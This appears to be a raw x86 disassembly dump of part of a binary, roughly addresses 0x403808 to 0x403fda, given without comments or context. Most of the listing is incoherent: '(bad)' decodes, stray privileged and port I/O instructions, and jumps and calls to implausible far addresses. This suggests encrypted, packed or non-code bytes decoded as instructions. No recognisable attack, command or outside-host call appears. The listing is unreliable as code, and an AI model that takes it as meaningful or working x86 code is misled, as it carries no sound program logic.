  403808:	or     DWORD PTR [edx],0xf32c29f
  40380e:	cmp    edi,DWORD PTR [esi+esi*2]
  403811:	mov    ecx,DWORD PTR [ebx+0x45f60881]
  403817:	dec    DWORD PTR [ebx+0x4db80c33]
  40381d:	dec    esi
  40381e:	mov    eax,DWORD PTR [eax]
  403820:	mov    DWORD PTR [ebx],edi
  403822:	mov    esi,DWORD PTR [ebp+0x4]
  403825:	xor    ecx,DWORD PTR [eax+0x5f]
  403828:	mov    ecx,DWORD PTR [ecx-0x3a67410]
  40382e:	push   ecx
  40382f:	leave  
  403830:	mov    eax,DWORD PTR [eax+edi*8]
  403833:	push   ebp
  403834:	test   ah,ch
  403836:	lahf   
  403837:	in     al,dx
  403838:	xor    al,bh
  40383a:	mov    esp,ebp
  40383c:	clc    
  40383d:	test   DWORD PTR [ebp-0x74baff08],ebx
  403843:	cmp    edx,DWORD PTR [eax]
  403845:	pushf  
  403846:	dec    ebp
  403847:	mov    ebp,DWORD PTR [ebx]
  403849:	in     al,dx
  40384a:	mov    ebx,DWORD PTR [ecx-0xc]
  40384d:	push   ecx
  40384e:	icebp  
  40384f:	add    eax,0x77208
  403854:	rol    DWORD PTR [ebp+0x72],0xc7
  403858:	add    al,dh
  40385a:	rol    DWORD PTR [ebp+0x4545f827],0x3
  403861:	cmp    al,0xf8
  403863:	pushf  
  403864:	dec    ebp
  403865:	mov    DWORD PTR [ebx],0x985f8fc
  40386b:	clc    
  40386c:	or     BYTE PTR [ebp+0x45],al
  40386f:	xor    eax,0x7080835
  403874:	pop    es
  403875:	dec    ebp
  403876:	dec    ebp
  403877:	lea    ecx,[ebp+0x72720101]
  40387d:	add    BYTE PTR [eax],al
  40387f:	dec    ebp
  403880:	inc    ebp
  403881:	sub    ebx,0x10518b59
  403887:	or     DWORD PTR [ebp-0x61],0x8b8b322b
  40388e:	cld    
  40388f:	adc    cl,dh
  403891:	scas   eax,DWORD PTR es:[edi]
  403892:	or     BYTE PTR [ebx],bh
  403894:	pop    es
  403895:	xadd   ebp,ebp
  403898:	jb     0x40389a
  40389a:	add    BYTE PTR [ebx+0x4d2910c1],cl
  4038a0:	inc    ebp
  4038a1:	sub    eax,DWORD PTR [ebx]
  4038a3:	mov    edi,eax
  4038a5:	lock dec ebp
  4038a7:	icebp  
  4038a8:	add    ecx,DWORD PTR [eax]
  4038aa:	clc    
  4038ab:	pop    es
  4038ac:	mov    eax,ecx
  4038ae:	data16 jb 0x4038b9
  4038b1:	add    BYTE PTR [ebp-0x3f],al
  4038b4:	xor    eax,0x7450830
  4038b9:	add    ecx,DWORD PTR [ebp-0x8]
  4038bc:	lea    ecx,[ebp+0x1]
  4038bf:	add    esi,DWORD PTR [edx-0x8]
  4038c2:	add    BYTE PTR [ecx],dl
  4038c4:	inc    ebp
  4038c5:	adc    bl,ch
  4038c7:	dec    ecx
  4038c8:	mov    ecx,DWORD PTR [ecx+0x45450408]
  4038ce:	mov    esi,DWORD PTR ds:0x74d080c
  4038d4:	mov    cl,BYTE PTR [ebp-0x78]
  4038d7:	lea    ecx,[ebx-0x768d07ff]
  4038dd:	add    al,bh
  4038df:	inc    ebp
  4038e0:	in     al,0xe9
  4038e2:	inc    DWORD PTR [eax]
  4038e4:	leave  
  4038e5:	add    BYTE PTR [eax*2-0x71374ab],cl
  4038ec:	push   ecx
  4038ed:	rol    DWORD PTR [ebp+0x4d],0x38
  4038f1:	sbb    DWORD PTR [ecx+ebx*2-0x7e07ae39],0x32f89f85
  4038fc:	sar    BYTE PTR [ebx],0x74
  4038ff:	jbe    0x40388c
  403901:	mov    edi,esp
  403903:	or     BYTE PTR [ecx+0x45],bl
  403906:	push   ecx
  403907:	mov    eax,DWORD PTR ds:0x4d720c
  40390d:	mov    eax,DWORD PTR [ebp-0x77]
  403910:	jne    0x40389d
  403912:	jmp    0x403908
  403914:	mov    ebx,DWORD PTR [ecx-0x8]
  403917:	push   ecx
  403918:	pop    ecx
  403919:	mov    edx,DWORD PTR [ecx-0x8]
  40391c:	add    eax,0x9f7284
  403921:	xor    cl,BYTE PTR [ebp-0x77]
  403924:	sub    edi,eax
  403926:	mov    DWORD PTR [ebx+0xc],ebx
  403929:	inc    ebp
  40392a:	inc    ebp
  40392b:	mov    esi,DWORD PTR ds:0x7c108f8
  403931:	dec    ebp
  403932:	lahf   
  403933:	xor    DWORD PTR [edx],0x8518b59
  403939:	or     DWORD PTR [ebp-0x61],0x3beb3288
  403940:	leave  
  403941:	jbe    0x40394b
  403943:	mov    edx,DWORD PTR [ebp+0x8]
  403946:	in     al,dx
  403947:	inc    ebp
  403948:	in     al,dx
  403949:	mov    eax,DWORD PTR [edx]
  40394b:	or     al,0x0
  40394d:	dec    ebp
  40394e:	inc    ebp
  40394f:	data16 cmp BYTE PTR [ecx],cl
  403952:	pushf  
  403953:	mov    edi,eax
  403955:	mov    esi,eax
  403957:	cld    
  403958:	test   DWORD PTR [ecx-0x8],ebx
  40395b:	push   ecx
  40395c:	inc    ebp
  40395d:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  403963:	lahf   
  403964:	pop    es
  403965:	xor    al,al
  403967:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40396d:	inc    ebp
  40396e:	or     al,0x3
  403970:	sar    al,0xf2
  403973:	dec    ebp
  403974:	lea    eax,[ebx]
  403976:	in     al,0xf8
  403978:	dec    DWORD PTR [ecx]
  40397a:	mov    DWORD PTR [eax],ecx
  40397c:	cld    
  40397d:	inc    ebp
  40397e:	inc    ebp
  40397f:	inc    eax
  403980:	mov    DWORD PTR [ebp-0x14],eax
  403983:	jmp    0xff9737cd
  403988:	mov    edi,0x70008c2
  40398d:	mov    eax,edi
  40398f:	push   ecx
  403990:	lahf   
  403991:	(bad)  
  403992:	xor    bh,ah
  403994:	add    eax,DWORD PTR [ebp+0x4510f889]
  40399a:	inc    ebp
  40399b:	cmp    ebp,eax
  40399d:	pushf  
  40399e:	std    
  40399f:	xor    edi,edi
  4039a1:	inc    eax
  4039a2:	fadd   DWORD PTR [eax+0x45]
  4039a5:	inc    ebp
  4039a6:	mov    esi,DWORD PTR ds:0x7510814
  4039ac:	inc    ebp
  4039ad:	lahf   
  4039ae:	xor    DWORD PTR [edx],0x8
  4039b1:	cmp    DWORD PTR [ebp+0xc],eax
  4039b4:	mov    eax,DWORD PTR [edx]
  4039b6:	clc    
  4039b7:	sub    al,0x40
  4039b9:	inc    ebp
  4039ba:	call   0xff4934f4
  4039bf:	pop    es
  4039c0:	inc    ebp
  4039c1:	lahf   
  4039c2:	push   DWORD PTR [edx]
  4039c4:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  4039ca:	std    
  4039cb:	dec    ebp
  4039cc:	dec    DWORD PTR [ebx+0x5908fcdb]
  4039d2:	inc    ebp
  4039d3:	push   ecx
  4039d4:	call   0xffb335de
  4039d9:	add    BYTE PTR [ebp+0x4d],al
  4039dc:	xor    eax,DWORD PTR [ebx]
  4039de:	add    ecx,DWORD PTR [eax+edx*2]
  4039e1:	add    DWORD PTR [ebp-0x45],esi
  4039e4:	inc    edx
  4039e6:	cld    
  4039e7:	add    BYTE PTR [ecx],dh
  4039e9:	mov    edi,edi
  4039eb:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  4039f5:	test   DWORD PTR [esi],ebx
  4039f7:	clc    
  4039f8:	inc    ebp
  4039f9:	inc    ebp
  4039fa:	mov    edi,DWORD PTR [ebx]
  4039fc:	mov    DWORD PTR [esp+ecx*1-0x74efba75],ebx
  403a03:	inc    ebp
  403a04:	or     al,0x85
  403a06:	shl    BYTE PTR [ebp+0x3b],0x33
  403a0a:	jne    0x4039f5
  403a0c:	xor    eax,DWORD PTR [eax]
  403a0e:	pop    edi
  403a0f:	add    BYTE PTR [ebx+0x45],bl
  403a12:	ret    0x85
  403a15:	je     0x403a5c
  403a17:	push   ebx
  403a18:	mov    eax,DWORD PTR [ebp-0xe02e8]
  403a1e:	mov    eax,DWORD PTR [ebp-0x75]
  403a21:	mov    ecx,DWORD PTR [esp+ecx*1]
  403a24:	in     al,dx
  403a25:	inc    ebp
  403a26:	or     DWORD PTR [ebx+0x5753f408],0x57
  403a2d:	pop    ecx
  403a2e:	test   BYTE PTR [ecx+0x0],dl
  403a31:	xor    eax,DWORD PTR [eax]
  403a33:	mov    esi,0x8472c0
  403a38:	add    dh,al
  403a3a:	add    BYTE PTR [ebp-0x49],al
  403a3d:	mov    esp,DWORD PTR [eax]
  403a3f:	or     al,0xc8
  403a41:	add    BYTE PTR [ebp-0x1],al
  403a44:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  403a4a:	inc    ebx
  403a4b:	inc    eax
  403a4c:	add    bl,ch
  403a4e:	xor    ecx,DWORD PTR [ebx-0x17f5f37f]
  403a54:	add    BYTE PTR [ecx+0x45f4f889],cl
  403a5a:	mov    eax,DWORD PTR gs:[eax]
  403a5d:	sub    cl,cl
  403a5f:	retf   0xff7c
  403a62:	mov    WORD PTR [ebp+0x10],cx
  403a66:	jae    0x403add
  403a68:	lea    ecx,[ebx+0x63fffcf6]
  403a6e:	xor    edi,edi
  403a70:	jne    0x8bcbafc3
  403a76:	or     al,0xfc
  403a78:	or     al,0x3e
  403a7a:	push   WORD PTR [ecx-0x75]
  403a7e:	jne    0x403a70
  403a80:	cmpxchg8b QWORD PTR [ecx]
  403a83:	(bad)  
  403a84:	mov    ch,0xff
  403a86:	add    ah,ch
  403a88:	data16 jne 0x403a5a
  403a8b:	call   0xff9e339c
  403a90:	cmovge edi,edx
  403a93:	xor    edi,DWORD PTR [ebx+eax*1]
  403a96:	add    BYTE PTR [ebx],bh
  403a98:	sub    eax,0xf8b5d74
  403a9d:	or     al,0xfa
  403a9f:	add    BYTE PTR [edi],cl
  403aa1:	inc    ebp
  403aa2:	cmp    al,0x8b
  403aa4:	mov    ebx,0x4d3b08
  403aa9:	sub    DWORD PTR [ebx],0x14
  403aac:	enterw 0x9ff8,0x3b
  403ab1:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  403ab6:	pop    edi
  403ab7:	or     al,0x45
  403ab9:	mov    esp,DWORD PTR [esi-0x8]
  403abc:	dec    ebp
  403abd:	inc    eax
  403abe:	data16 jmp 0x403b0e
  403ac1:	push   ebp
  403ac2:	jb     0x403ab0
  403ac4:	jmp    0x403b0b
  403ac6:	inc    DWORD PTR [ebx+0x7d7f10f8]
  403acc:	mov    eax,DWORD PTR [eax]
  403ace:	or     BYTE PTR [esi-0x49],dl
  403ad1:	jo     0x74406c86
  403ad7:	test   DWORD PTR [edx+0xf],eax
  403ada:	jmp    DWORD PTR [edi+0xf77000f]
  403ae0:	inc    DWORD PTR [eax+0x33]
  403ae3:	mov    ebx,DWORD PTR [edi-0x77]
  403ae6:	pop    ebx
  403ae7:	lock ret 0xd2
  403aeb:	push   ebp
  403aec:	dec    ebp
  403aed:	mov    eax,0xf68a81
  403af2:	dec    eax
  403af4:	ror    ax,0x3b
  403af8:	rol    BYTE PTR [eax],0x3b
  403afb:	dec    ebp
  403afc:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  403b05:	pop    edi
  403b06:	in     al,dx
  403b07:	cmp    edx,DWORD PTR [edi-0xc]
  403b0a:	clc    
  403b0b:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  403b12:	cmp    al,dh
  403b14:	jne    0x403acd
  403b16:	xor    edi,esp
  403b18:	jmp    0xcd3c7a
  403b1d:	mov    ebp,DWORD PTR [ecx+edi*1]
  403b20:	jne    0x403b24
  403b22:	call   0xfff8385e
  403b27:	mov    edi,0x14e97
  403b2c:	add    BYTE PTR [ebx],bh
  403b2e:	inc    edi
  403b2f:	jne    0x403aba
  403b31:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  403b38:	mov    eax,0x8974471f
  403b3d:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  403b44:	add    BYTE PTR [esi+0xa8d1f45],bh
  403b4a:	stos   BYTE PTR es:[edi],al
  403b4b:	add    BYTE PTR [eax],al
  403b4d:	mov    bx,di
  403b50:	les    esi,FWORD PTR [ebx]
  403b52:	xchg   DWORD PTR [esi+0x0],esp
  403b55:	iret   
  403b56:	add    BYTE PTR [edx],dl
  403b58:	inc    ebp
  403b59:	jle    0x403ae8
  403b5b:	(bad)  
  403b5c:	out    dx,al
  403b5d:	cld    
  403b5e:	add    BYTE PTR [ebx+0x39ccf489],cl
  403b64:	xchg   esp,edi
  403b66:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  403b6d:	push   0x32
  403b6f:	pop    edi
  403b70:	add    BYTE PTR [ebp-0x77],dh
  403b73:	paddq  mm1,mm2
  403b76:	xchg   DWORD PTR [ecx+eax*1],edi
  403b79:	add    BYTE PTR [eax],al
  403b7b:	adc    ecx,DWORD PTR [ecx+0x457eb083]
  403b81:	test   eax,ebp
  403b83:	inc    DWORD PTR [eax]
  403b85:	inc    DWORD PTR [eax]
  403b87:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  403b8e:	dec    DWORD PTR [ebx-0x3e020718]
  403b94:	inc    esp
  403b96:	inc    ebp
  403b97:	inc    DWORD PTR [ebp-0x52ccf0cd]
  403b9d:	data16 add BYTE PTR [ebp-0x75],cl
  403ba1:	(bad)  
  403ba3:	rcl    BYTE PTR [esi-0x1e],0x74
  403ba7:	mov    edi,DWORD PTR [eax-0x7d]
  403baa:	lock push eax
  403bac:	jle    0x403b39
  403bae:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  403bb4:	mov    eax,DWORD PTR [ebx+0x7f80018]
  403bba:	jge    0x403b7c
  403bbc:	mov    esi,DWORD PTR [eax]
  403bbe:	adc    al,0x0
  403bc0:	enter  0xd06a,0xff
  403bc4:	dec    ebp
  403bc5:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  403bcb:	mov    edi,DWORD PTR [ebx]
  403bcd:	lods   al,BYTE PTR ds:[esi]
  403bce:	ja     0x403bd0
  403bd0:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  403bd6:	pop    ebp
  403bd7:	lea    edi,[ecx]
  403bd9:	inc    esp
  403bda:	clc    
  403bdb:	inc    ebp
  403bdc:	outs   dx,BYTE PTR ds:[esi]
  403bdd:	lea    eax,[ebx]
  403bdf:	push   bp
  403be1:	inc    ebp
  403be2:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  403be8:	pop    edi
  403be9:	mov    DWORD PTR [esi-0x40],ebx
  403bec:	jae    0x403b75
  403bee:	cmp    eax,DWORD PTR [eax]
  403bf0:	adc    al,0x0
  403bf2:	pop    eax
  403bf3:	inc    ebp
  403bf4:	sbb    al,0x8d
  403bf6:	mov    ecx,esp
  403bf8:	or     BYTE PTR [eax],al
  403bfa:	cmp    al,0x89
  403bfc:	mov    eax,ecx
  403bfe:	cld    
  403bff:	xchg   DWORD PTR [ebp+0x0],edx
  403c02:	add    eax,DWORD PTR [eax]
  403c04:	add    eax,DWORD PTR [ebp+0x2b]
  403c07:	lea    ecx,[eax]
  403c09:	adc    BYTE PTR [ebp+0x0],al
  403c0c:	or     ecx,DWORD PTR [ecx-0x78763000]
  403c12:	fadd   QWORD PTR [ecx]
  403c14:	push   ebp
  403c15:	add    BYTE PTR [ebx+0x1b8d0045],al
  403c1b:	push   esp
  403c1c:	inc    ebp
  403c1d:	add    bh,bh
  403c1f:	push   edi
  403c20:	adc    BYTE PTR [ebp-0x18],bh
  403c23:	mov    ebp,edi
  403c25:	fdivr  st,st(7)
  403c27:	cli    
  403c28:	dec    ebp
  403c29:	add    BYTE PTR [ebp-0x74788bb0],al
  403c2f:	add    esp,edi
  403c31:	add    BYTE PTR [eax],bh
  403c33:	xor    BYTE PTR [ebp-0x51],al
  403c36:	cmp    edi,0xfffffffc
  403c39:	mov    edi,edi
  403c3b:	lock in al,dx
  403c3d:	rcl    ah,0x84
  403c40:	pop    ebp
  403c41:	add    BYTE PTR [ebx+0x0],al
  403c44:	pop    ebp
  403c45:	dec    eax
  403c46:	cmp    edx,DWORD PTR [ebx-0x8]
  403c49:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  403c50:	add    al,0x24
  403c52:	push   ebp
  403c53:	dec    esi
  403c54:	in     al,dx
  403c55:	mov    eax,DWORD PTR [ebp+0x20]
  403c58:	push   esi
  403c59:	pop    esi
  403c5a:	mov    al,0x3
  403c5c:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  403c62:	add    DWORD PTR [ebx],eax
  403c64:	add    BYTE PTR [ebx],al
  403c66:	inc    ebp
  403c67:	mov    eax,ebp
  403c69:	hlt    
  403c6a:	(bad)  
  403c6b:	push   ebp
  403c6c:	dec    DWORD PTR [ecx-0x4fe07f2]
  403c72:	push   es
  403c73:	add    ecx,ecx
  403c75:	pop    ebp
  403c76:	or     BYTE PTR [ebx],dh
  403c78:	jns    0x5e02253f
  403c7e:	ret    0x76
  403c81:	jmp    0x403c12
  403c83:	mov    eax,DWORD PTR [ecx]
  403c85:	in     al,0x0
  403c87:	jge    0x403c74
  403c89:	sysexit 
  403c8b:	cmp    al,0x8a
  403c8d:	cmp    eax,DWORD PTR [eax]
  403c8f:	sbb    BYTE PTR [edx],cl
  403c91:	pop    ebp
  403c92:	add    BYTE PTR [esi+0x66],bh
  403c95:	jae    0x403c98
  403c97:	mov    eax,ecx
  403c99:	call   0xb9b7:0x8b025583
  403ca0:	mov    ebx,0x8d4e55
  403ca5:	mov    al,0x3b
  403ca7:	fdiv   DWORD PTR [ebp-0x8]
  403caa:	xor    edx,DWORD PTR [ebp+0x66]
  403cad:	mov    DWORD PTR [ecx],0x10087ec
  403cb3:	add    BYTE PTR [eax],al
  403cb5:	push   ebp
  403cb6:	ret    
  403cb7:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  403cbd:	jne    0x403cbf
  403cbf:	mov    eax,ecx
  403cc1:	fadd   QWORD PTR [esi]
  403cc3:	xor    al,0xc7
  403cc5:	push   ebx
  403cc6:	or     dh,dh
  403cc8:	icebp  
  403cc9:	inc    DWORD PTR [eax+0x8f4348b]
  403ccf:	rol    BYTE PTR [edx+0x5],0xa
  403cd3:	inc    ebp
  403cd4:	stc    
  403cd5:	mov    DWORD PTR [ebp-0x75],esi
  403cd8:	(bad)  
  403cd9:	lock add BYTE PTR [ebp-0x7a],al
  403cdd:	add    al,0x1
  403cdf:	dec    ebp
  403ce0:	add    BYTE PTR [ebp-0x39],dh
  403ce3:	mov    eax,ebx
  403ce5:	call   0xe8c3c675
  403cea:	sbb    al,0x5d
  403cec:	mov    edi,0xf85e8572
  403cf1:	pop    edi
  403cf2:	jge    0x403cb6
  403cf4:	lea    eax,[eax]
  403cf6:	add    ecx,DWORD PTR [ebx+0x88b8b45]
  403cfc:	or     bh,bh
  403cfe:	leave  
  403cff:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  403d06:	dec    ebp
  403d07:	add    BYTE PTR [ebp-0xff7f075],al
  403d0d:	xchg   ebp,eax
  403d0e:	add    bh,bh
  403d10:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  403d16:	mov    esi,DWORD PTR [ebx]
  403d18:	or     al,0x39
  403d1a:	dec    ebp
  403d1b:	pop    esi
  403d1c:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  403d22:	jmp    0xec88:0x898b9c04
  403d29:	add    BYTE PTR [ecx-0x76ec17ad],cl
  403d2f:	inc    ebx
  403d30:	or     al,0x0
  403d32:	dec    ebp
  403d33:	add    eax,0x103bc7
  403d38:	test   DWORD PTR [ecx+0x25983f8],ecx
  403d3e:	push   ecx
  403d3f:	ret    0xfbb
  403d42:	lea    eax,[edx]
  403d44:	push   DWORD PTR [ebp+0x66330045]
  403d4a:	mov    eax,ebx
  403d4c:	sub    esp,eax
  403d4e:	add    eax,eax
  403d50:	clc    
  403d51:	mov    DWORD PTR [ebx-0x7477ff75],edx
  403d57:	add    BYTE PTR [ebx+ebx*2],cl
  403d5a:	dec    ebp
  403d5b:	push   edi
  403d5c:	xor    edi,eax
  403d5e:	xor    eax,DWORD PTR [esi+0x8018d]
  403d64:	in     eax,0xe7
  403d66:	add    BYTE PTR [ebx],al
  403d68:	inc    ebp
  403d69:	jmp    0x403d9e
  403d6b:	xor    bh,0x4a
  403d6e:	mov    ebp,ecx
  403d70:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  403d76:	xor    eax,DWORD PTR [eax-0x10c481d5]
  403d7c:	jne    0x403d7e
  403d7e:	mov    ecx,DWORD PTR [ebx+0x458808]
  403d84:	mov    eax,DWORD PTR [ebx]
  403d86:	hlt    
  403d87:	pop    edi
  403d88:	add    BYTE PTR [ebp-0x37],dl
  403d8b:	in     al,dx
  403d8c:	push   es
  403d8d:	in     al,dx
  403d8e:	dec    edx
  403d8f:	push   edi
  403d90:	xor    al,0x38
  403d92:	pop    ss
  403d93:	pushf  
  403d94:	dec    ebp
  403d95:	mov    DWORD PTR [eax+0x614759e8],eax
  403d9b:	mov    ecx,edx
  403d9d:	in     al,0x4d
  403d9f:	dec    ebp
  403da0:	add    BYTE PTR [ebp-0x43df0a7],0xe9
  403da7:	add    dl,dl
  403da9:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  403daf:	test   BYTE PTR [eax+0x8008b00],cl
  403db5:	dec    ebp
  403db6:	push   ebp
  403db7:	mov    DWORD PTR [eax+0x4d72f4],edi
  403dbd:	mov    eax,ecx
  403dbf:	clc    
  403dc0:	into   
  403dc1:	dec    ebp
  403dc2:	retf   0x18c7
  403dc5:	lock dec ebp
  403dc7:	test   DWORD PTR [ebx-0x31baf308],ecx
  403dcd:	push   ebx
  403dce:	(bad)  
  403dcf:	jge    0x403d9b
  403dd1:	push   esi
  403dd2:	enter  0xce45,0x89
  403dd6:	dec    ebp
  403dd7:	cld    
  403dd8:	jmp    0xff7b3d22
  403ddd:	pushf  
  403dde:	inc    ebp
  403ddf:	mov    esi,0x78b0833
  403de4:	sub    esp,DWORD PTR [ecx+0x3]
  403de7:	int    0x8
  403de9:	mov    ecx,DWORD PTR [ebp+0xc]
  403dec:	mov    eax,esi
  403dee:	adc    bl,cl
  403df0:	(bad)  
  403df1:	enter  0x4d85,0xff
  403df5:	jmp    0x853ef9
  403dfa:	xor    eax,DWORD PTR [ebp+0x5e]
  403dfd:	mov    ebp,ebx
  403dff:	or     al,0x8b
  403e01:	(bad)  
  403e02:	call   0x51cc97d5
  403e07:	ds add eax,0x8b7264
  403e0d:	or     cl,cl
  403e0f:	ror    BYTE PTR [ecx+esi*8],cl
  403e12:	push   ebp
  403e13:	inc    ebp
  403e14:	in     al,dx
  403e15:	mov    ebp,esp
  403e17:	or     al,0xc7
  403e19:	(bad)  
  403e1a:	lock into 
  403e1c:	test   ecx,eax
  403e1e:	clc    
  403e1f:	rol    BYTE PTR [ebp+0x34],1
  403e22:	cmp    eax,DWORD PTR [ebp-0x64]
  403e25:	add    ecx,DWORD PTR [ebx-0x7b27604]
  403e2b:	mov    al,BYTE PTR [ebp-0x7b]
  403e2e:	xor    BYTE PTR [ebp-0x64],dh
  403e31:	xor    al,0x56
  403e33:	sub    al,0xc7
  403e35:	jmp    0x403e23
  403e37:	mov    ebx,DWORD PTR [eax]
  403e39:	lock jmp 0xf02a:0x8bb27df1
  403e41:	mov    ebx,DWORD PTR [ecx-0x14]
  403e44:	push   ecx
  403e45:	icebp  
  403e46:	xor    eax,DWORD PTR [edx]
  403e48:	mov    edx,0x617280
  403e4d:	enter  0x4dc8,0xfa
  403e51:	add    ecx,edx
  403e53:	cld    
  403e54:	scas   eax,DWORD PTR es:[edi]
  403e55:	add    ebx,ebp
  403e57:	dec    ebp
  403e58:	mov    ecx,DWORD PTR [ebx-0x608a1708]
  403e5e:	xor    esi,DWORD PTR [edx]
  403e60:	xor    ebp,DWORD PTR [ebx]
  403e62:	add    esi,DWORD PTR [ebx]
  403e64:	add    edi,DWORD PTR [ebx]
  403e66:	test   DWORD PTR [ebp-0x75],esi
  403e69:	mov    edi,eax
  403e6b:	adc    BYTE PTR [ebp+0x55],cl
  403e6e:	je     0x403ea3
  403e70:	xor    esi,DWORD PTR [ebx]
  403e72:	xor    ebp,DWORD PTR [ebx]
  403e74:	add    ebp,DWORD PTR [ebx]
  403e76:	add    esi,DWORD PTR [ebx]
  403e78:	ror    DWORD PTR [ecx+0x68ec108b],cl
  403e7e:	enter  0xcaff,0x8b
  403e82:	icebp  
  403e83:	or     al,0xa
  403e85:	(bad)  
  403e86:	lock retf 
  403e88:	enter  0xf2c8,0x4d
  403e8c:	retf   0xee89
  403e8f:	or     BYTE PTR [ebp+0x45],dh
  403e92:	mov    edi,DWORD PTR [ebx]
  403e94:	cld    
  403e95:	bswap  eax
  403e97:	pop    edi
  403e98:	mov    esp,0x328b9fff
  403e9d:	in     al,0x8b
  403e9f:	(bad)  
  403ea0:	hlt    
  403ea1:	pop    ebx
  403ea2:	jne    0x403eac
  403ea4:	xor    eax,DWORD PTR [ebp+0x33]
  403ea7:	xor    eax,0x73b082b
  403eac:	jbe    0x403e4d
  403eae:	mov    esi,DWORD PTR [edx]
  403eb0:	clc    
  403eb1:	pop    edi
  403eb2:	mov    edx,eax
  403eb4:	mov    eax,DWORD PTR [eax]
  403eb6:	clc    
  403eb7:	mov    ecx,ecx
  403eb9:	adc    DWORD PTR [ebp+0x14],0xffffffec
  403ebd:	inc    ebp
  403ebe:	in     al,dx
  403ebf:	cmp    BYTE PTR [esp+ebx*4],al
  403ec2:	add    bh,al
  403ec4:	inc    ebp
  403ec5:	cld    
  403ec6:	cmp    BYTE PTR [ebp+0x3c7f89c],al
  403ecc:	hlt    
  403ecd:	inc    ebp
  403ece:	test   edi,eax
  403ed0:	clc    
  403ed1:	hlt    
  403ed2:	inc    ebp
  403ed3:	test   DWORD PTR [eax],edi
  403ed5:	clc    
  403ed6:	pushf  
  403ed7:	push   edi
  403ed8:	push   ebx
  403ed9:	inc    ebp
  403eda:	inc    ebp
  403edb:	fdivr  DWORD PTR [ecx]
  403edd:	xlat   BYTE PTR ds:[ebx]
  403ede:	pushf  
  403edf:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  403ee5:	mov    eax,0x7070808
  403eea:	xor    edi,eax
  403eec:	mov    edi,0x32729f
  403ef1:	xor    eax,edi
  403ef3:	add    eax,DWORD PTR [ebp+0x3]
  403ef6:	(bad)  
  403ef7:	pavgb  mm7,mm1
  403efa:	test   DWORD PTR [esi-0x8],eax
  403efd:	dec    ebp
  403efe:	inc    ebp
  403eff:	mov    ebx,eax
  403f01:	cld    
  403f02:	xlat   BYTE PTR ds:[ebx]
  403f03:	enter  0xf0c7,0xf0
  403f07:	retf   0xf200
  403f0a:	add    dh,cl
  403f0c:	leave  
  403f0d:	jne    0x403f54
  403f0f:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  403f15:	enter  0xf0ce,0xc7
  403f19:	retf   0xf2cf
  403f1c:	scas   eax,DWORD PTR es:[edi]
  403f1d:	out    dx,al
  403f1e:	jmp    0x403f6d
  403f20:	mov    esi,DWORD PTR [ebx]
  403f22:	cld    
  403f23:	add    eax,edi
  403f25:	xor    eax,esi
  403f27:	jmp    0x403f6e
  403f29:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  403f2f:	add    edi,edi
  403f31:	ror    DWORD PTR [ecx+0x45f8f889],cl
  403f37:	dec    ebp
  403f38:	mov    esi,DWORD PTR [ebx]
  403f3a:	cld    
  403f3b:	lea    eax,[edi+ecx*1+0xff72e0]
  403f42:	mov    ecx,DWORD PTR [ebp-0xc]
  403f45:	mov    ecx,DWORD PTR [ebp-0x4]
  403f48:	xor    esi,eax
  403f4a:	(bad)  
  403f4b:	enter  0xce08,0x72
  403f4f:	stc    
  403f50:	add    BYTE PTR [edx+0x5f8b4545],ch
  403f56:	call   0x33858c5e
  403f5b:	pop    esi
  403f5c:	xor    eax,ebx
  403f5e:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  403f64:	enter  0xb900,0xc7
  403f68:	inc    ebp
  403f69:	in     al,dx
  403f6a:	xor    eax,DWORD PTR [ebp+0x4589f803]
  403f70:	clc    
  403f71:	cmp    eax,DWORD PTR [ebp-0x64]
  403f74:	cmp    edi,eax
  403f76:	pushf  
  403f77:	call   0xf92bc607
  403f7c:	mov    eax,edi
  403f7e:	loopne 0x403f64
  403f80:	inc    ebp
  403f81:	test   DWORD PTR [ebx],esi
  403f83:	clc    
  403f84:	add    eax,DWORD PTR [ebp-0x2d]
  403f87:	push   esi
  403f88:	mov    DWORD PTR [ecx-0x4],ebx
  403f8b:	push   ecx
  403f8c:	inc    ebp
  403f8d:	push   edi
  403f8e:	mov    al,dh
  403f90:	mov    BYTE PTR [edi+0x34d320b],bl
  403f96:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  403f9c:	xor    esi,DWORD PTR [eax]
  403f9e:	mov    DWORD PTR [eax+ecx*1-0x7403b239],ebx
  403fa5:	sbb    BYTE PTR [eax],cl
  403fa7:	jmp    0xca:0x8cf45ce
  403fae:	mov    WORD PTR [ebx-0xb007420],cs
  403fb4:	mov    ecx,DWORD PTR [ebp-0x4]
  403fb7:	xor    ecx,edx
  403fb9:	xor    ecx,DWORD PTR [ebp+0x3]
  403fbc:	mov    eax,DWORD PTR [ebx]
  403fbe:	hlt    
  403fbf:	bswap  esi
  403fc1:	rol    DWORD PTR [ecx+esi*1+0x2b32459f],0x89
  403fc9:	xor    ecx,DWORD PTR [eax]
  403fcb:	mov    DWORD PTR [ebp-0x8],eax
  403fce:	xor    ebx,DWORD PTR [ebp-0x47]
  403fd1:	call   0x403e63
  403fd6:	enter  0x4d45,0x8b
  403fda:	mov    eax,edi
